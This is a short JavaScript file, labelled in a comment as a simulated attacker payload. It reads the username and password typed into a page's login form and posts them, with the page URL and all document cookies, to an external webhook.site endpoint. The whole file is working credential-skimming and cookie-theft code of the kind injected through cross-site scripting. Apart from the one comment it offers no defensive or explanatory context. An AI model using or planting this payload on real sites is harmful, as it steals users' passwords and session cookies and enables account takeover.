// Simulated attacker payload
const username = document.querySelector('input[type=text]')?.value;
const password = document.querySelector('input[type=password]')?.value;

fetch('https://webhook.site/389656c6-21f4-4d3d-a0d9-778a6799c4e0', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    site: document.location.href,
    username: username,
    password: password,
    cookies: document.cookie
  })
});
